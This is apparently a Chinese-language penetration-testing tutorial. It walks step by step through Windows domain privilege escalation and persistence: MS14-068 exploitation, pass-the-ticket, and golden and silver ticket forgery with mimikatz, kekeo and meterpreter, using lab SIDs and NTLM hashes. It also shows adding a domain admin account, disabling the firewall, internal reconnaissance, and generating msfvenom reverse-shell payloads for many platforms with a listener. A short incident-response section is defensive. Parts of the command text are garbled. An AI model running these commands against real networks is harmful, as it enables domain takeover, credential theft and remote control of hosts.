ticket，票据传递主要根据kerberos协议认证原理来进行攻击的。主要的手段是伪造票据，经常使用的伪造黄金票据和白银票据，后面我们一一演示，其实黄金和白银票据伪造主要归类为权限维持，不过也是pass the ticket的手段。 MS14-068 powershell执行 1.查看当前sid whoami user 2.启动mimikatz，不需要提升权限，能用就行 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造 kerberos::purge 查看当前机器凭证 kerberos::list 将票据注入到内存中 kerberos::ptc [票据文件] 3.利用ms14-068生成TGT数据 ms14-068.exe -u [域成员名]@[域名] -s [sid] -d [域控IP地址] -p [域成员密码] MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778- 1124 -d 192.168.241.21 - p admin!@#45 4.票据注入内存 kerberos::ptc TGT_mary@god.org.ccache 5. 查看凭证列表 klist 6.利用 dir \\192.168.241.21\\c$ 方式1：MS14-068https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 这个漏洞是域提权漏洞，原理就和黄金票据相似，通过生成黄金票据，导入工具中，将一个普通权限的域用户获取域管的使用权限，从而达到控制整个域。还有一些其他的域提权漏洞，比如Zerologon 域提权漏洞等等，有兴趣的可以研究一下。 当获取域用户时，对这个域进行信息收集，获取是否MS14-068相应补丁情况： systeminfo | findstr “3011780” 好，该补丁没有打，猜测存在MS14-068漏洞。 ms14-068exp使用方法： ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址 下面我们使用mary主机来进行测试。 收集域成员的SID： whoami all whoami user #只单独查询SID 如下 查看用户，为普通域用户 查询mary用户的sid 收集域管账号及域名称： net time #获取域管账号 net config workstation #获取域信息 nltest dsgetdc:moonsec #获取域管信息 在域控主机中查看mary的权限，先查看一下域管理员组 发现mary没有在里面 再查看普通域用户组 在mary主机上使用一下mimikatz，看效果，权限不够 使用ms14-068的exp来生成TGT黄金票据 .\\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.241.21 -p admin!@#45 查看一下当前计算机的票据，也就是当前主机和哪些主机建立过连接，这都是之前用过的票据 首先要清除一下票据，因为之前用过的票据还是低权限票据。现在伪造出来的票据是域管理员用户的TGT票据，属于system高权限票据。 cmd指令：klist purge mimikatz指令： kerberos::purge #清空票据 kerberos::ptc 票据 #导入票据 kerberos::list #查看票据 通过mimikatz导入前面生成的票据来完成提权。 然后查看一下票据信息，出现了一个新的凭据信息 使用凭据连接域控主机，重新开启一个powershell，直接就可以连接域控主机了。 然后可以使用psexec反弹cmd，这里就不演示了 Psexec64.exe accepteula s \\OWA2010CN-God.god.org cmd.exe # \\域名，我们这里如果渗透的是marypc，那么需要写成marypc的域名 通过反弹的shell可创建域管账号 net user jaden Jaden123 add domain net group “Domain Admins” jaden add domain 然后可以看看，如果票据删除了，我们就不能连接了。 方式2：kekeo工具https://github.com/gentilkiwi/kekeo 上面的方法生成凭据时用的是明文密码，kekeo这个工具可以用ntlm hash密码来生成凭据 第二种利用工具kekeo 1.生成票据 .\\kekeo “tgt::ask user:[域成员名] domain:[域名] ntlm:[ntlm值]” .\\kekeo “tgt::ask user:mary domain:god.org ntlm:518b98ad4178a53695dc997aa02d455c” 2.导入票据 kerberos::ptt [票据文件] kerberos::ptt TGT_mary@GOD.ORG_krbtgtgod.org@GOD.ORG.kirbi 3.查看凭证 klist 4.利用net use载入 dir \\192.168.241.21\\c$ TGT生成成功，我们为了看效果，先清除一下原有的票据 通过kekeo来导入票据 查看内存中的票据是否存在了 连接域控看看是否成功，这里有点问题，我再排查排查再给大家更新吧 方式3：利用本地票据 这种方式需管理权限，利用mimikatz收集本地票据，再将票据导入到内存中进行连接。有存活时间限制，就是说，将web主机之前与其他主机建立过连接之后缓存的票据导出出来，然后找到和域控主机的连接票据，拿来导入到内存中使用，看看还能不能用，如果过期了，那肯定不能用了，也是一种尝试。 privilege::debug sekurlsa::tickets export kerberos::ptt [票据文件] 导出票据： 票据会自动保存到mimikatz所在目录，如下： 想用哪个文件对应的票据就可以把这个文件放到mimikatz的目录下，通过指定文件名称就能将对应票据导入到内存中 比如，先清空一下内存中的票据 然后导入票据进行使用 查看klist，票据导入成功了 实战中用处不是很大，但是也可能会发挥一点作用，作用不大的原因是票据的有效期一般只有10个小时。 总结：ptt传递不需本地管理员权限，连接时主机名连接，基于漏洞、工具、本地缓存的票据 2-6 黄金票据和白银票据6-1 黄金票据 英文名为：Golden Tickets，这里讲的是黄金票据的伪造。 域中有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递。域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要获取到krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket。 1-1 获取krbtgt用户哈希****DCSync (mimikatz) mimikatz 会模拟域控，向目标域控请求账号密码信息。 这种方式动静更小，不用直接登陆域控，也不需要提取NTDS.DIT文件。需要域管理员或者其他类似的高权限账户。所以我们其实最开始要想办法获取到域控管理员的用户名和密码。下面我就直接在域控主机上获取krbtgt用户的hash值了。 lsadump::dcsync user:krbtgt LSA(mimikatz) mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取 privilege::debug lsadump::lsa inject name:krbtgt kiwi(meterpreter) 除了mimikatz，还可以使用meterpreter的wiki扩展 meterpreter getuid meterpreter load kiwi meterpreter dcsync_ntlm krbtgt Hashdump(meterpreter) meterpreter hashdump 1-2 金票伪造****方式1：mimikatz 利用mimikatz导出krbtgt账号信息 mimikatz.exe “privilege::debug” “lsadump::dcsync domain:God.org user:krbtgt” “exit”loghash.txt 效果如下 利用mimikatz生成黄金票据，需要上面获取到的krbtgt用户的NTML hash和SID mimikatz.exe “kerberos::golden admin:system domain:God.org sid:S-1-5-21-1218902331-2157346161-1782232778 krbtgt:b097d7ed97495408e1537f706c357fc5 ticket:ticket.kirbi” exit # 注意这里的是域SID+RID(-502) RID去掉后才是域SID，我这里尝试的时候没有去掉，感觉也没问题 如下，我们在webserver主机上去生成金票 清空webserver主机内存中缓存的之前的票据，然后访问DC域控主机的资源，看效果 将票据注入内存： kerberos::purge #清除票据 或者klist purge kerberos::ptt 票据文件名称，如果没有和mimikatz在同一目录下就写文件路径 #将票据注入内存 给webserver主机注入TGT金票 成功了，那么webserver基本上可以访问域内的域控主机和其他主机了。注意：做实验的时候别忘了看看是否有之前建立的IPC连接，它会影响我们的实验。 方式2：kiwi(meterpreter) 不演示了。 1. 加载kiwi load kiwi 2. 创建票据 golden_ticket_create -d 域名 -u 任意用户名 -s -k -t 例如：golden_ticket_create -d God.org -u jaden -s sid:S-1-5-21-1218902331-2157346161-1782232778-502 -k b097d7ed97495408e1537f706c357fc5 -t tmpkrbtgt.ticket 3. 注入到内存 kerberos_ticket_use tmpkrbtgt.ticket 4. 也可使用wmic在WEB机器上执行命令，下面的指令按照自己的实际环境来写 wmic authority:”kerberos:god\\WEB” node:”WEB” process call create “calc” 6-2 白银票据 黄金票据是伪造的 TGT，白银票据就是伪造的 ST，白银票据也称为专票,就是指定去访问某一个服务的。 当我们获取到域内一台服务器的域用户NTLM Hash之后，就可以对ST票据进行伪造。在前面的Kerberos认证模型中，ST是经过目标服务器的NTLM Hash加密的，在最后进行验证的时候，服务器会解密ST，从中取出用户信息，然后和客户端发送的用户信息做一个对比，完成验证。因此，如果获取到目标服务端的NTLM Hash，那么这两段客户端发送的信息都可以进行伪造。（这里注意一点：是目标服务器的某用户的NTLM Hash，而不是域内随便一个用户的NTLM Hash）制作白银票据的条件 1、domain: 指定域名 2、sid: 客户端用户的sid号 3、target: 需要访问的域服务器的计算机全名 4、rc4: 目标服务器的某用户的NTLM Hash值，一般用administrator的 5、service：需要伪造的服务，例如cifs访问文件服务 6、user: 指定需要伪造的用户 7、ptt: 将伪造的票据导入内存 比如：我们在域环境中，得到了域控主机账号的 NTLM Hash 值，然后尝试利用白银票据的伪造，访问域控上的文件服务列表。 mimikatz 先获取域控主机的administrator的NTML hash值和SID值 得到服务账号的 HASH 之后使用mimikatz中的 kerberos::golden功能生成白银票据TGS ticket。 先清除原有的一些票据，然后访问域控的文件服务： 失败，因为没有票据，然后在webserver主机上执行如下指令来伪造ST银票： kerberos::golden domain:god.org sid:S-1-5-21-1218902331-2157346161-1782232778 target:owa.god.org rc4:ccef208c6485269c20db2cad21734fe7 service:cifs user:administrator ptt kerberos::golden domain:god.org sid:S-1-5-21-1218902331-2157346161-1782232778 target:192.168.241.21 rc4:ccef208c6485269c20db2cad21734fe7 service:cifs user:administrator ptt 伪造出来的应该是20分钟有效期，如果失效了就继续伪造。 然后再次访问DC的文件服务 2-7 SPN漏洞期待中。。。Kerberoasting攻击、spn扫描等等 2-8 ladon工具国产Ladon内网渗透强力工具，还可以配合CS，作为CS的插件，功能齐全。主要是信息收集-协议扫描-漏洞探针-传递攻击等 下载地址： Ladon：https://github.com/k8gege/Ladon Ladon 9.1.1 CobaltStrike神龙插件发布：http://k8gege.org/Ladon/cs911.html 使用说明文档： http://k8gege.org/Ladon/ http://k8gege.org/p/Ladon.html 8-1 信息收集 收集在线存活主机 8-2 wiki 工具的使用说明： 我们用一下命令终端工具： 收集存活主机 8-3 漏洞扫描 批量扫描是否存在ms17010漏洞，回显为紫色的表示存在这个漏洞。 8-4 探测服务 比如探测smb服务的开放情况 8-5 连接工具 还可以直接使用ladon中集成的psexec工具来进行连接 这就是这个工具的强大之处，集成了很多的功能，包括我们前面讲到的很多工具，所以通过这个工具就可以完成内网横向渗透。 1-9-3 CS内网渗透CS插件： https://github.com/pandasec888/taowu-cobalt-strike CS插件： https://github.com/rsmudge/Elevatekit CS插件： https://github.com/DeEpinGh0st/Erebus CS插件：https://github.com/k8gege/Ladon # 巨龙拉冬\\拉登 巨龙拉冬\\拉登使用说明：https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA 3-27 内网信息收集怎么做本机信息收集 —– ## 网络配置，系统和软件信息，服务信息，进程列表，计划任务，用户，端口，补丁，防火墙配置 权限查询 —– ## 当前用户权限，指定用户权限 判断存不存在域 ——- ## ipconfig查询，查看系统详细信息，查询当前登录域及登录用户信息，判断主域 探测域内存主机 —- ## NetBIOS快速探测，ICMP协议探测，ARP协议探测等 1、基本信息收集 ## 进程列表，版本，补丁，服务，任务，防护 2、用户信息收集 ## 域用户，本地用户，用户权限，组信息… 3、网络信息收集 ## 端口，环境，代理通道… 1.获取本机网络配置信息 ipconfig all 2.操作系统和软件信息 #1.操作系统及其版本信息 systeminfo | findstr B C:”OS 名称” C:”OS 版本” #2.系统体系结构 echo %PROCESSOR_ARCHITECTURE% #3.安装的软件及版本，路径等 ## 利用wmic命令，将结果输出到文本文件 wmic product get name,version ## 利用powershell，收集软件的版本信息 powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version” 3.查询本机服务信息 wmic service list brief 4.查询进程列表 ## 可以查看到当前进程列表和用户，分析软件，邮件客户，VPN和杀毒软件等进程 tasklist ## 查看进程信息 wmic process list brief 5.查看启动程序信息 wmic startup get command,caption 6.查看计划任务 schtasks query fo LIST v 7.查看主机开机时间 net statistics workstation 8.查询用户列表 ## 查看本机用户列表 net user ## 获取本地管理员信息 net localgroup administrators 9.列出或断开本地计算机与所连接的客户端之间的会话 net session 10.查询端口列表 netstat -ano 11.查看补丁列表 ## 查看系统的详细信息 systeminfo ## 查看安装在系统中的补丁 wmic qfe get Caption,Description,HotFixID,InstalledOn 12.查询本机共享列表 net share ## 利用wmic命令查找 wmic share get name,path,status 13.查询路由表及所有可用接口的ARP缓存表 route print arp -a 14.查询防火墙配置 ## 关闭防火墙 ## win server 2003之前的版本 netsh firewall set opmode disable ## win server 2003之后的版本 netsh advfirewall set allprofiles state off ## 查看防火墙配置 netsh firewall show config ## 修改防火墙配置 #1.允许指定程序全部连接 ## win server 2003之前的版本 netsh firewall add allowedprogram C: c.exe “allow nc” enable ## win server 2003之后的版本 netsh advfirewall firewall add rule name”pass nc” dirin actionallow program”C: c.exe” #2.允许指定程序退出 netsh advfirewall firewall add rule name”Allow nc” dirout actionallow program”C: c.exe” #3.允许3389端口放行 netsh advfirewall firewall add rule name”Allow nc” dirout actionallow program”C: c.exe” #4.自定义防火墙日志的存储位置 netsh advfirewall set currentprofile logging filename “C:\\windows\\temp\\fw.log” 15.查看代理配置情况 reg query “HKEY_CURRENT_USER\\Software\\Micrsoft\\Windows\\CurrentVersion\\Internet Settings” 16.查询并开启远程连接服务 ## 查看远程连接端口 ## 在cmd环境中执行注册表查询语句，连接端口为0x3d，转换后为3389 REG QUERY “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp” V PortNumber ## 在windows server 2003中开启3389端口 wmic path win32_terminalservicesetting where (_CLASS ! “”) call setallowsconnections 1 ## 在windows server 2008和2012中开启3389端口 wmic namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (_CLASS !””) call setallowtsconnections 1 wmic namespace:\\root\\cimv2\\terminalserver path win32_tsgenralsetting where (TerminalName’RDP-Tcp’) call setuserauthenticationrequired 1 reg add “HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER” v fSingleSessionPerUser t REG_DWORD d 0 f 三、权限查询 1.查看当前权限 whoami ## 如果内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。 ## 本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有机器都有一个机器用户（用户名是机器名加上$），在本质上，机器的system用户对应的就是域里面的机器用户，所以，使用system权限可以运行域内查询命令 2.获取域SID whoami all 3.查询指定用户的详细信息 net user 用户名 domain 四、判断是否存在域 1.ipconfig查询 ## 查看网关IP地址，DNS的IP地址，域名，本机是否和DNS服务器处于同一网段，然后通过反向nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一服务器上 2.查看系统详细信息 systeminfo ## 域即域名，登录服务器为域控制器，如果域为WORKGROUP，表示当前服务器不在域内 3.查询当前登录域及登录用户信息 net config workstation 4.判断主域 net time domain ## 执行之后通常有三种情况：存在域，但当前用户不是域用户；存在域，且当前用户是域用户；当前网络环境为工作组，不存在域 五、探测域内存活主机 1.NetBIOS快速探测 ## NetBIOS是局域网程序使用的一种应用程序编程接口(API)，为程序提供了请求低级别服务的统一的命令集，为局域网提供了网络及其他特殊功能。几乎所有的局域网都是在 NetBIOS 协议的基础上工作的。NetBIOS 也是计算机的标识名，主要用于局域网中计算机的互访。NetBIOS 的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。nbtscan 是一个命令行工具，用于扫描本地或远程TCPIP网络上的开放 NetBIOS 名称服务器。nbtscan 有 Windows 和 Linux 两个版本，体积很小，不需要安装特殊的库或 DLL 就能使用。 2.ICMP协议探测 ## 依次对内网中的每个IP地址执行ping命令，可以使用以下命令探测整个C段 for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL” 3.ARP协议探测 （1）arp-sacn工具 ## 将arp.exe下载到机器上运行，可以自定义掩码，指定扫描范围，kali中也带有此工具 arp.exe -t 192.168.1.020 （2）Empire中的arpsacn模块 ## 用于在局域网内发送ARP包，收集活跃主机的IP和MAC地址，在Empire中输入一下命令可以使用arpscan模块 usemodule situational_awarenessnetworkarpscan （3）Nishang中的Invoke-ARPScan.ps1脚本 ## 可以将脚本上传到目标主机中运行，也可以直接远程加载脚本，自定义掩码和扫描范围，命令如下： powershell.exe -exec bypass -Command “ {Import-Module C:\\windows\\temp\\Invoke-ARPScan,psl; Invoke-ARPScan -CIDR 192.168.1.020}” C:\\windows\\temp\\log.txt (4)通过TCPIP端口探测内网 使用sacnline工具 scanline -h -t 22.80-89,110,3389,3306 -u 53,161,137,139 -o c:\\windows\\temp\\log.txt -p 192.168.1.1-254 b 3-28 对常见病毒的应急响应## 蠕虫病毒： 定义：一种自包含的程序，每入侵到新的计算机就会进行复制自身并执行 特点：服务器不断向外网发起主动连接等 应急响应： 1.将感染病毒的主机从内网隔离 2.使用D盾协助查杀端口连接情况，通过端口异常跟踪进程ID 3.全盘扫描，定位异常文件 4.使用多引擎在线病毒对异常文件扫描，查看感染哪种蠕虫病毒 5.关闭异常端口、清除文件、使用专用病毒工具对服务器进行清查 网页篡改： 类型：明显篡改、隐藏式 原理：明显的网页篡改即攻击者可炫耀自己的技术技巧，或表明自己的观点，如之前的某中学官网被黑事件；隐藏式篡改一般是将被攻击网站的网页植入链接色情、诈骗等非法信息的链接中，以通过灰黑色产业牟取非法经济利益。 应急响应： 1.查找近段时间内被篡改的文件或者新增的文件，查看被篡改文件或新增文件的最后修改时间，确定是否为自己修改或新增 2.打开被篡改的文件，检查里面有无新增恶意代码或被篡改了其他内容 3.如果被篡改文件没被修改，就说明可能被篡改的内容被注入数据库中，网站有注入漏洞，先把注入漏洞补上，在把被注入到数据库的内容清除 勒索病毒： 原理：勒索病毒，是一种伴随数字货币兴起的病毒木马，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，勒索病毒一般利用非对称加密算法和对称加密算法组合的形式对受害者文件进行加密。 特点：中毒的业务系统无法访问、文件后缀被篡改、勒索信展示等 应急响应： 1.隔离被感染的服务器主机 2.排查业务系统 3.利用留下的勒索信息，确定勒索病毒的种类，再进行溯源分析 4.处置勒索病毒： (1)异常文件检查并清除 (2)补丁检查，没补丁打补丁 (3)对账号进行排查，删除可疑账号 (4)异常进程、连接排查，杀掉可疑进程，断开异常连接 (5)计划任务排查 (6)对网络流量进行排查 5.清除加固加安全设备 挖矿病毒： 特点： 利用感染主机与挖矿域名连接进行挖矿，感染主机出现主机卡顿和CPU占用高等现象 应急响应： 1.隔离主机，阻断传播 2. top命令查看CPU占用 ，查看CPU占用较高的进程 3. 通过PID获得对应进程目录和进程， 定位进程目录或文件 4. 通过沙箱分析文件，确定病毒种类和病毒行为 5.对异常文件进行分析 6. 排查计划任务 7. 排查ssh公钥 8. 通过etcrc.local排查主机启动项 9.排查账户 10. 查看主机日志 11. 查看定时任务 12.清除加固 四，kali4-1 msf4-1-1 msfconsole介绍msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种渗透文件，利用网站，手机等的漏洞将到目标靶机，操控目标靶机…这边仅供学习使用! 打开终端，检查环境是否安装。输入命令： msfconsole 注：默认kali 预装了metasploit-framework，即msfconsole命令，如果没有或提示：msfconsole:commad not found，请自行安装： apt install metasploit-framework 4-1-2 生成pyload参数介绍-p, –payload payload ## 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的 -l, –list [module_type] # 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n, –nopsled length # 为payload预先指定一个NOP滑动长度 -f, –format format # 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表) -e, –encoder [encoder] # 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload -a, –arch architecture # 指定payload的目标架构，例如x86 | x64 | x86_64 –platform platform 指定payload的目标平台 -s, –space length # 设定有效攻击荷载的最大长度，就是文件大小 -b, –bad-chars list # 设定规避字符集，指定需要过滤的坏字符例如：不使用 ‘\\x0f’、’\\x00’; -i, –iterations count 指定payload的编码次数 -c, –add-code path # 指定一个附加的win32 shellcode文件 -x, –template path # 指定一个自定义的可执行文件作为模板,并将payload嵌入其中 -k, –keep # 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options # 列举payload的标准选项 -o, –out path # 指定创建好的payload的存放位置 -v, –var-name name # 指定一个自定义的变量，以确定输出格式 –shellest # 最小化生成payload -h, –help # 查看帮助选项 –help-formats # 查看msf支持的输出格式列表 4-1-3 msf控制台参数运用- banner #这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。 - use #这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数 - Search #当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。 使用命令 help search 可以查看具体使用方法； 其他使用方法： 查mysql:search name:mysql; 查joomla:search joomla;查ubutu漏洞：searchsploit ubuntu 16.04；查ms08-067漏洞：search ms08-067 …… - show #这个命令用的很多。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。 4-1-4 实战通过msf制作反弹链接，即php 渗透文件: msfvenom -p phpmeterpreterreverse_tcp lhost192.168.78.129 lport8080 -o venom.php 列举常用的平台或语言的攻击文件生成命令 ## 普通生成： msfvenom -p windowsmeterpreterreverse_tcp -f exe -o C:\\back.exe ## 编码处理型： msfvenom -p windowsmeterpreterreverse_tcp -i 3 -e x86shikata_ga_na -f exe -o C:\\back.exe ## 捆绑： msfvenom -p windowsmeterpreterreverse_tcp -platform windows -a x86 -x C: omal.exe -k -f exe -o C:\\shell.exe ## Windows: msfvenom -platform windows -a x86 -p windowsx64meterpreterreverse_tcp -f exe -o C:\\back.exe ## Linux: msfvenom -p linux86meterpreterreverse_tcp LHOST LPORT -f elf shell.elf ## MAC: msfvenom -p osxx86shelLreverse_tcp LHOST LPORT -f macho shell.macho ## PHP: msfvenom -p phpmeterpreterreverse_tcp LHOST LPORT -f raw shell.php ## AsP: msfvenom -p windowsmeterpreterreverse_tcp LHOST LPORT -f asp shell.asp ## Aspx: msfvenom -p windowsmeterpreterreverse_tcp LHOST LPORT -f asp shell.aspx ## JSP: msfvenom - p javajsp_shellreverse_tcp LHOST LPORT -f raw shell.jsp ## War： msfvenom -p javajsp_shelLreverse_tcp LHOST LPORT -f war shell.war ## Bash: msfvenom -p cmdunixreverse_bash LHOST LPORT -f raw shell.sh ## Perl: msfvenom -p cmdunixreverse_perl LHOST LPORT -f raw shell.pl ## Python: msfvenom -p pythonmeterpreterreverser_tcp LHOST LPORT -f raw shell.py 监听 打开另外一个终端，启动msf控制面板，启动如文首一内的msfconsole简介，在msf控制面板依次输入以下命令： use exploitmultihandler #使用监听模块 set payload phpmeterpreterreverse_tcp #设置tcp_php的反弹链接，和渗透文件的payload保持一致 set lhost 192.168.78.129 #本机ip，与生成渗透文件的host保持一致 set lport 8080 #本机端口，与生成渗透文件保持一致 exploit 4-2 常用命令ls dev -alh –sortsize – ## 长列表展示dev目录下的所有文件，直观展示文件大小并按照文件大小进行排序 less : ———————– ## 从头到尾,只展示末尾一段占满窗口内容，按q退出 tail : ———————– ## 默认展示10行内容 top: ————— ## 查看系统资源占用情况 df: ———————— ## 查看磁盘分区以及挂载点空间占用情况 df -h ~ -h 直观的展示文件大小(标注文件大小单位K,M,G) free: ## 查看当前系统内存使用情况 free -h #显示内存占用情况并显示单位 ifconfig: ## 查看网卡信息或者对网卡进行操作 fconfig eth0 down ——————- 停掉eth0网卡 ifconfig eth0 up ————— 开启eth0网卡 4-2-1 apt-getsudo apt-get update # 更新软件包列表 sudo apt-get upgrade # 更新已安装软件包 sudo apt-get install # 安装软件包 sudo apt-get remove # 删除软件包 4-2-2 ifconfigifconfig # 显示网络接口的详细信息 ifconfig eth0 # 显示eth0网络接口的详细信息 ifconfig eth0 up # 启用eth0网络接口 ifconfig eth0 down # 禁用eth0网络接口 4-2-3 netstatnetstat # 显示所有网络连接信息 netstat -t # 显示TCP协议的网络连接信息 netstat -u # 显示UDP协议的网络连接信息 netstat -a # 显示所有网络连接信息，包括已关闭的连接 4-2-4 pingping www.google.com # 发送ping请求到www.google.com ping -c 5 192.168.0.1 # 发送5个ping请求到192.168.0.1主机 4-2-5 sshssh root@192.168.0.1 # 连接到192.168.0.1主机上的root用户 ssh -p 2222 root@192.168.0.1 # 连接到2222端口上的192.168.0.1主机上的root用户 4-2-6 nmapnmap 192.168.0.024 # 扫描192.168.0.024网络上的所有主机 nmap -p 1-1000 192.168.0.1 # 扫描192.168.0.1主机上的1-1000端口 4-2-7 hydrahydra -l admin -P password.txt ftp://192.168.0.1 # 在192.168.0.1主机上使用password.txt中的密码尝试登录ftp服务器，用户名为admin 4-2-8 metasploitmetasploit命令是一个渗透测试框架，它包含了许多有用的漏洞利用工具和荷载。它可以帮助您测试网络安全，并发现系统中的漏洞。 msfconsole # 打开metasploit控制台 search smb # 在metasploit中搜索SMB漏洞 use exploitwindowssmbms08_067_netapi # 使用ms08_067_netapi漏洞利用攻击windows系统 4-2-9 toptop # 显示正在运行的进程列表 top -u root # 显示以root用户运行的进程列表 4-2-10 psps -ef # 显示所有正在运行的进程 ps -u root # 显示以root用户运行的进程 ps -aux # 列出所有进程，并显示更详细的信息 -a 显示当前终端关联的所有进程 -u 基于用户格式显示 -x 显示所有进程 -e 表示所有的进程 -f 完整格式的输出 ## STAT 进程状态 R ## 正在运行 S ## 正在睡眠 T ## 正在侦测或停止 Z ## 僵尸进程（这个进程死了，但是无法停掉父进程） D ## 不可终端的状态 ## 特殊的状态 S ## 表示优先级比较高 SN ## 表示优先级比较低 s ## 表示进程是控制进程 L ## 进程有页面锁定在内存中 I ## 表示进程是多线程 + ## 表示当前进程运行在前台 4-2-11 dfdf # 显示系统中所有磁盘分区的使用情况 df -h # 显示人类可读的格式的磁盘使用情况 4-2-12 awkcat file.txt | awk ‘{print $1}’ # 从file.txt文件中提取第一列数据 ps -ef | awk ‘$3 1 {print $0}’ # 显示以PID 1的进程为父进程的进程列表","tags":[null]}]